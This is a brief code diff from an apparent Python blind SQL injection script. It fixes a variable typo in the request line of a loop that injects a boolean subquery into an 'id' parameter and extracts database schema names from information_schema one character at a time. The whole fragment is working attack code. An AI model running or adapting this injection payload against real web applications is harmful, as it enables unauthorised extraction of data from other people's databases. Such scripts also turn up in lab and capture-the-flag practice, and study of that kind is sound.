@@ -29,7 +29,7 @@ def makeSQLI():
       sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(sechema_name) from information_schema.schemata),%d,1)) from users where id = 1)=%d)" % (position, character)
       
       p1.status(sqli_url)
-      r = requests.get(sqli.url)
+      r = requests.get(sqli_url)
       
       if r.status_code == 200:
         extracted_info += chr(character)
